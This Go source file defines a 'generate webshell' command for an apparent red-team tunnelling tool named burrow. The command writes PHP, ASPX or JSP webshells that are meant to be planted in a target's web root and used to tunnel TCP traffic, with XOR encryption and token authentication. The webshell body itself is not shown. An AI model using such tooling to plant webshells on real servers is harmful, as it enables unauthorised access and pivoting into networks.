package cmd

import (
	"fmt"
	"os"

	"github.com/loudmumble/burrow/internal/httptunnel/webshell"
	"github.com/spf13/cobra"
)

var generateCmd = &cobra.Command{
	Use:   "generate",
	Short: "Generate tunnel components",
	Long:  `Generate deployable tunnel components such as webshells.`,
}

var generateWebshellCmd = &cobra.Command{
	Use:   "webshell",
	Short: "Generate HTTP tunnel webshell (PHP/ASPX/JSP)",
	Long: `Generate a webshell that implements the HTTP tunnel protocol.

Deploy the generated file to the target's web root, then connect with:
  burrow httptunnel client -c https://target/shell.php -k <key>

The webshell supports the same protocol as 'burrow httptunnel server':
  - XOR encryption with shared key
  - SHA256-based X-Token authentication
  - TCP session management (connect/send/recv/disconnect/ping)

Examples:
  burrow generate webshell --format php --key s3cret -o tunnel.php
  burrow generate webshell --format aspx --key s3cret -o tunnel.aspx
  burrow generate webshell --format jsp --key s3cret -o tunnel.jsp
  burrow generate webshell --format php --key s3cret  (prints to stdout)`,
	Example: `  burrow generate webshell -f php -k s3cret -o tunnel.php
  burrow generate webshell -f aspx -k s3cret -o tunnel.aspx
  burrow generate webshell -f jsp -k s3cret -o tunnel.jsp`,
	Run: func(cmd *cobra.Command, args []string) {
		format, _ := cmd.Flags().GetString("format")
		key, _ := cmd.Flags().GetString("key")
		output, _ := cmd.Flags().GetString("output")

		cfg := webshell.Config{
			Format: webshell.Format(format),
			Key:    key,
		}

		result, err := webshell.Generate(cfg)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] Error: %v\n", err)
			os.Exit(1)
		}

		if output != "" {
			if err := os.WriteFile(output, []byte(result), 0644); err != nil {
				fmt.Fprintf(os.Stderr, "[!] Error writing file: %v\n", err)
				os.Exit(1)
			}
			fmt.Printf("[*] Webshell written to %s (%d bytes)\n", output, len(result))
			fmt.Printf("[*] Connect with: burrow httptunnel client -c <url>/%s -k %s [-l 127.0.0.1:1080]\n", output, key)
		} else {
			fmt.Print(result)
		}
	},
}

func init() {
	rootCmd.AddCommand(generateCmd)
	generateCmd.AddCommand(generateWebshellCmd)

	generateWebshellCmd.Flags().StringP("format", "f", "", "Webshell format: php, aspx, or jsp")
	generateWebshellCmd.Flags().StringP("key", "k", "", "Shared encryption/authentication key")
	generateWebshellCmd.Flags().StringP("output", "o", "", "Output file path (default: stdout)")

	generateWebshellCmd.MarkFlagRequired("format")
	generateWebshellCmd.MarkFlagRequired("key")
}
